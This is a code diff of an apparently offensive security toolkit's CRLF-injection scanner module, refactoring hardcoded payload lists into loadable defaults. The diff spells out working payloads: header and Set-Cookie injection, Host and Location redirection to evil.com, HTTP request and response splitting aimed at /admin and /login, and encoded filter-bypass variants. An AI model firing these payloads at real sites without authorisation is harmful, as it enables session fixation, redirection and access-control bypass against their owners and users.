@@ -17,7 +17,7 @@ Fluxo:
 """
 import argparseimport asyncioimport loggingfrom collections.abc import Awaitablefrom dataclasses import asdict, dataclassfrom urllib.parse import parse_qs, urlencode, urlparse, urlunparseimport httpxfrom mytools.core.utils import (    Cyber,    add_common_args,    color,    create_async_client,    create_banner,    print_exploit_info,    run_main_loop,    safe_asyncio_run,    write_output,)logger = logging.getLogger("mytools.crlfinjection")
 
-_CATEGORY_MAP: dict[str, list[str]] = {
+_CATEGORY_MAP_DEFAULT: dict[str, list[str]] = {
     "param": ["get_crlf", "post_crlf", "json_crlf"],
     "header": ["ua_crlf", "referer_crlf", "cookie_crlf", "xff_crlf"],
     "path": ["path_crlf", "path_split"],
@@ -25,7 +25,14 @@ _CATEGORY_MAP: dict[str, list[str]] = {
     "bypass": ["encoded_crlf", "double_encode", "nullbyte_crlf"],
 }
 
-_CRLF_PAYLOADS: list[tuple[str, str]] = [
+def _load_category_map() -> dict[str, list[str]]:
+    from mytools.data import load_payloads
+    data = load_payloads("web", "crlfinjection", default={"category_map": _CATEGORY_MAP_DEFAULT})
+    return data.get("category_map", _CATEGORY_MAP_DEFAULT)
+
+_CATEGORY_MAP = _load_category_map()
+
+_CRLF_PAYLOADS_DEFAULT: list[tuple[str, str]] = [
     ("crlf_header", "\r\nX-Injected: test-crlf"),
     ("crlf_cookie", "\r\nSet-Cookie: evil=injected"),
     ("crlf_host", "\r\nHost: evil.com"),
@@ -36,14 +43,28 @@ _CRLF_PAYLOADS: list[tuple[str, str]] = [
     ("crlf_location", "\r\nLocation: http://evil.com"),
 ]
 
-_SPLIT_PAYLOADS: list[tuple[str, str]] = [
+def _load_crlf_payloads() -> list[tuple[str, str]]:
+    from mytools.data import load_payloads
+    data = load_payloads("web", "crlfinjection", default={"crlf_payloads": _CRLF_PAYLOADS_DEFAULT})
+    return [tuple(item) for item in data.get("crlf_payloads", _CRLF_PAYLOADS_DEFAULT)]
+
+_CRLF_PAYLOADS = _load_crlf_payloads()
+
+_SPLIT_PAYLOADS_DEFAULT: list[tuple[str, str]] = [
     ("split_simple", "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<h1>SPLIT</h1>"),
     ("split_admin", "GET /admin HTTP/1.1\r\nHost: target\r\n\r\n"),
     ("split_cookie", "POST /login HTTP/1.1\r\nHost: target\r\nCookie: admin=1\r\n\r\n"),
     ("split_double", "GET /ok HTTP/1.1\r\n\r\nGET /admin HTTP/1.1\r\n\r\n"),
 ]
 
-_ENCODED_PAYLOADS: list[tuple[str, str]] = [
+def _load_split_payloads() -> list[tuple[str, str]]:
+    from mytools.data import load_payloads
+    data = load_payloads("web", "crlfinjection", default={"split_payloads": _SPLIT_PAYLOADS_DEFAULT})
+    return [tuple(item) for item in data.get("split_payloads", _SPLIT_PAYLOADS_DEFAULT)]
+
+_SPLIT_PAYLOADS = _load_split_payloads()
+
+_ENCODED_PAYLOADS_DEFAULT: list[tuple[str, str]] = [
     ("percent_0d0a", "%0d%0aX-Injected: test"),
     ("percent_0a", "%0aX-Injected: test"),
     ("percent_0d", "%0dX-Injected: test"),
@@ -52,14 +73,28 @@ _ENCODED_PAYLOADS: list[tuple[str, str]] = [
     ("backslash_rn", "\\r\\nX-Injected: test"),
 ]
 
-_SPLIT_POINTS: list[tuple[str, str, str]] = [
+def _load_encoded_payloads() -> list[tuple[str, str]]:
+    from mytools.data import load_payloads
+    data = load_payloads("web", "crlfinjection", default={"encoded_payloads": _ENCODED_PAYLOADS_DEFAULT})
+    return [tuple(item) for item in data.get("encoded_payloads", _ENCODED_PAYLOADS_DEFAULT)]
+
+_ENCODED_PAYLOADS = _load_encoded_payloads()
+
+_SPLIT_POINTS_DEFAULT: list[tuple[str, str, str]] = [
     ("url_path", "/%0d%0aX-Injected:%20test", "path"),
     ("query_param", "?q=%0d%0aX-Injected:%20test", "param"),
     ("fragment", "/#%0d%0aX-Injected:%20test", "path"),
     ("path_end", "/page%0d%0aX-Injected:%20test", "path"),
 ]
 
-_HEADER_NAMES: list[str] = [
+def _load_split_points() -> list[tuple[str, str, str]]:
+    from mytools.data import load_payloads
+    data = load_payloads("web", "crlfinjection", default={"split_points": _SPLIT_POINTS_DEFAULT})
+    return [tuple(item) for item in data.get("split_points", _SPLIT_POINTS_DEFAULT)]
+
+_SPLIT_POINTS = _load_split_points()
+
+_HEADER_NAMES_DEFAULT: list[str] = [
     "User-Agent",
     "Referer",
     "Cookie",
@@ -67,6 +102,13 @@ _HEADER_NAMES: list[str] = [
     "Accept-Language",
     "X-Requested-With",
 ]
+
+def _load_header_names() -> list[str]:
+    from mytools.data import load_payloads
+    data = load_payloads("web", "crlfinjection", default={"header_names": _HEADER_NAMES_DEFAULT})
+    return data.get("header_names", _HEADER_NAMES_DEFAULT)
+
+_HEADER_NAMES = _load_header_names()
 
 
 @dataclass(frozen=True, slots=True)
